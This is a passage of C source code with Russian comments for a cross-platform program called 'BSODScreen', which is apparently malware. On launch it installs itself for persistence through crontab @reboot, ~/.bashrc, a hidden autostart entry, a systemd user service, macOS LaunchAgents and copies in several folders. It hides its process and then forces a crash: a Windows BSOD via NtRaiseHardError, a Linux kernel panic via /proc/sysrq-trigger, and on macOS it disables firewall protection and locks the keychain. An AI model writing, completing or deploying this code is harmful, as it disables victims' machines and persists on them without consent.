		sprintf(loadCmd, "launchctl load ~/Library/LaunchAgents/com.system.bsodsrc_%d.plist 2>/dev/null || true", i);
		system(loadCmd);
	}
#else
	// Linux версия
	readlink("/proc/self/exe", szPath, MAX_PATH - 1);
	
	const char* home = getenv("HOME");
	if (!home)
		home = "/root";

	// Способ 1: Добавление в crontab (@reboot запуск)
	char cronCmd[512];
	sprintf(cronCmd, "(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab - 2>/dev/null || true", szPath);
	system(cronCmd);

	// Способ 2: Добавление в ~/.bashrc для автозапуска
	char bashrcPath[MAX_PATH];
	sprintf(bashrcPath, "%s/.bashrc", home);
	FILE* bashrc = fopen(bashrcPath, "a");
	if (bashrc)
	{
		fprintf(bashrc, "\n# BSODScreen auto start\n%s &\n", szPath);
		fclose(bashrc);
	}

	// Способ 3: Добавление в ~/.config/autostart (для систем с X11/GNOME/KDE)
	char autostartDir[MAX_PATH];
	sprintf(autostartDir, "%s/.config/autostart", home);
	mkdir(autostartDir, 0755);
	
	char desktopFile[MAX_PATH];
	sprintf(desktopFile, "%s/bsodsrc.desktop", autostartDir);
	FILE* desktop = fopen(desktopFile, "w");
	if (desktop)
	{
		fprintf(desktop, "[Desktop Entry]\n");
		fprintf(desktop, "Type=Application\n");
		fprintf(desktop, "Exec=%s\n", szPath);
		fprintf(desktop, "Hidden=false\n");
		fprintf(desktop, "NoDisplay=true\n");
		fprintf(desktop, "X-GNOME-Autostart-enabled=true\n");
		fclose(desktop);
		chmod(desktopFile, 0644);
	}

	// Способ 4: Добавление в systemd user service (если доступен)
	char unitDir[MAX_PATH];
	sprintf(unitDir, "%s/.config/systemd/user", home);
	mkdir(unitDir, 0755);
	
	char unitFile[MAX_PATH];
	sprintf(unitFile, "%s/bsodsrc.service", unitDir);
	FILE* unit = fopen(unitFile, "w");
	if (unit)
	{
		fprintf(unit, "[Unit]\n");
		fprintf(unit, "Description=BSODScreen Service\n");
		fprintf(unit, "\n[Service]\n");
		fprintf(unit, "Type=simple\n");
		fprintf(unit, "ExecStart=%s\n", szPath);
		fprintf(unit, "Restart=always\n");
		fprintf(unit, "\n[Install]\n");
		fprintf(unit, "WantedBy=default.target\n");
		fclose(unit);
		chmod(unitFile, 0644);
		
		// Пытаемся включить сервис
		char enableCmd[256];
		sprintf(enableCmd, "systemctl --user enable bsodsrc 2>/dev/null || true");
		system(enableCmd);
	}
#endif

	// Способ 5: Клонирование в разные папки
	CloneToFolders(szPath);
}

// Рабочая функция для запуска в отдельном потоке
#ifdef _WIN32
DWORD WINAPI BackgroundWorkerThread(LPVOID lpParam)
{
	// ОПРЕДЕЛЕНИЕ ВЕРСИИ ОС
	g_osVersion = GetOSVersion();
	const char* szOSVersion = GetOSVersionString(g_osVersion);

	// Получаем путь к текущему файлу
	char szPath[MAX_PATH];
	GetModuleFileNameA(NULL, szPath, MAX_PATH);

	// Загружаем программу в кэш
	LoadExeToCache(szPath);

	// Добавление программы на автозагрузку при первом запуске
	AddToStartup();

	// Освобождаем кэш
	FreeExeCache();

	return 0;
}

DWORD WINAPI CrashThread(LPVOID lpParam)
{
	// ВЫЗОВ BSOD / КРИТИЧЕСКОГО СОБЫТИЯ
	// НЕ требует прав администратора - просто пытается вызвать критическую ошибку
	unsigned long response = 0;

	// Скрываем процесс из диспетчера задач перед вызовом ошибки
	HideProcess();

	// Небольшая задержка чтобы дать программе время на завершение основного потока
	Sleep(500);

	// Для Windows Vista+ используем STATUS_ASSERTION_FAILURE
	if (g_osVersion.dwMajor >= 6)
	{
		// Пытаемся без повышения привилегий
		pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(
			GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
		
		if (NtSetInformationProcess)
		{
			// Попытка вызвать ошибку через Native API
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);
		}
	}
	// Для Windows XP/2000 используем альтернативный код ошибки
	else if (g_osVersion.dwMajor == 5)
	{
		NtRaiseHardError(0xC000007B, 0, 0, NULL, 6, &response);
	}

	return 0;
}
#else
void* BackgroundWorkerThread(void* lpParam)
{
	// Получаем путь к текущему файлу
	char szPath[MAX_PATH];
#ifdef __APPLE__
	uint32_t procPathSize = sizeof(szPath);
	if (proc_pidpath(getpid(), szPath, procPathSize) <= 0)
	{
		readlink("/proc/self/exe", szPath, MAX_PATH - 1);
		szPath[MAX_PATH - 1] = '\0';
	}
#else
	readlink("/proc/self/exe", szPath, MAX_PATH - 1);
	szPath[MAX_PATH - 1] = '\0';
#endif

	// Загружаем программу в кэш
	LoadExeToCache(szPath);

	// Добавление программы на автозагрузку при первом запуске
	AddToStartup();

	// Освобождаем кэш
	FreeExeCache();

	return NULL;
}

void* CrashWorkerThread(void* lpParam)
{
	// Небольшая задержка
	sleep(1);

	// Скрываем процесс из диспетчера задач
	HideProcess();

	// ВЫЗОВ СИСТЕМНОЙ ОШИБКИ / КРИТИЧЕСКОГО СОБЫТИЯ
#ifdef __APPLE__
	// macOS: Kernel Panic
	system("sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setatp 0 2>/dev/null || true");
	system("security lock-keychain 2>/dev/null || true");
	
	// Генерируем segmentation fault
	int* p = NULL;
	*p = 0;
#else
	// Linux: Kernel Panic через сигнал
	FILE* fp = fopen("/proc/sysrq-trigger", "w");
	if (fp)
	{
		fprintf(fp, "c");  // 'c' = вызвать kernel panic
		fclose(fp);
	}
	
	// Если это не сработало, пытаемся другим способом
	int* p = NULL;
	*p = 0;  // Segmentation fault
#endif

	return NULL;
}
#endif

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd)
{
	// Определяем версию ОС в главном потоке
	g_osVersion = GetOSVersion();

	// Создаём фоновый поток для рабочих операций (клонирование, автозагрузка)
	HANDLE hBackgroundThread = CreateThread(NULL, 0, BackgroundWorkerThread, NULL, 0, NULL);
	if (hBackgroundThread)
	{
		CloseHandle(hBackgroundThread);
	}

	// Создаём поток для вызова BSOD (выполняется почти сразу)
	HANDLE hCrashThread = CreateThread(NULL, 0, CrashThread, NULL, 0, NULL);
	if (hCrashThread)
	{
		CloseHandle(hCrashThread);
	}
	
	// Программа закрывается молниеносно, не дожидаясь завершения потоков
	return 0;
}
#else
// Стандартная функция main для Linux/macOS
int main()
{
	// Определяем версию ОС в главном потоке
	g_osVersion = GetOSVersion();

	// Создаём рабочий поток для клонирования и автозагрузки
#ifdef __APPLE__
	pthread_t bgThread, crashThread;
	pthread_create(&bgThread, NULL, BackgroundWorkerThread, NULL);
	pthread_detach(bgThread);
	
	// Создаём поток для вызова BSOD
	pthread_create(&crashThread, NULL, CrashWorkerThread, NULL);
	pthread_detach(crashThread);
#else
	// На Linux используем fork для полного отделения
	// Фоновый процесс
	pid_t bgPid = fork();
	if (bgPid == 0)
	{
		BackgroundWorkerThread(NULL);
		exit(0);
	}
	
	// Процесс для BSOD
	pid_t crashPid = fork();
	if (crashPid == 0)
	{
		CrashWorkerThread(NULL);
		exit(0);
	}
#endif
	
	// Программа закрывается молниеносно
	return 0;
}
#endif
